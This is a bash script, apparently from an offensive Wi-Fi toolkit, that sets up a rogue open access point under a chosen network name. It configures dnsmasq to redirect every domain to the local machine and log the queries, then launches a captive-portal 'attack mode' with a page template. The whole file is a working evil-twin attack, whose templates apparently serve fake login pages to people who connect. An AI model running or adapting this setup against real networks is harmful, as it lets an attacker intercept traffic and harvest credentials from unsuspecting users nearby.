#!/bin/bash

# Get parameters
INTERFACE="$1"
WIFINAME="$2"
TEMPLATE="$3"

# Path to templates
TEMPLATE_DIR="templates/$TEMPLATE"

# Check template path
if [ ! -d "$TEMPLATE_DIR" ]; then
    echo "[!] Template $TEMPLATE not found!"
    exit 1
fi

# Clean up function
cleanup() {
    echo -e "\n[*] Cleaning up and restoring network..."
    sudo pkill hostapd
    sudo pkill dnsmasq
    sudo pkill -f server.py
    sudo ifconfig $INTERFACE down
    sudo systemctl restart NetworkManager
    sudo systemctl restart wpa_supplicant
    sudo rfkill unblock wlan
    sudo ip link set $INTERFACE up
    echo "[+] Network restored!"
}
trap cleanup EXIT

# Generate hostapd config
cat > includes/config/hostapd.conf <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$WIFINAME
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Generate dnsmasq config
cat > includes/config/dnsmasq.conf <<EOF
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
log-queries
log-dhcp
EOF

# Setup Wi-Fi interface
echo "[*] Setting up $INTERFACE..."
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
sudo rfkill unblock wlan
sudo ifconfig $INTERFACE down
sudo ifconfig $INTERFACE 10.0.0.1 netmask 255.255.255.0 up

# Start services
echo "[*] Starting hostapd..."
sudo hostapd includes/config/hostapd.conf > includes/config/hostapd.log 2>&1 &

sleep 2

echo "[*] Starting dnsmasq..."
sudo dnsmasq -C includes/config/dnsmasq.conf > includes/config/dnsmasq.log 2>&1 &

sleep 2

echo "[*] Launching captive portal with template '$TEMPLATE'..."
sudo python3 AttackModes/captiveportal.py "$TEMPLATE_DIR" "$INTERFACE" "$WIFINAME"

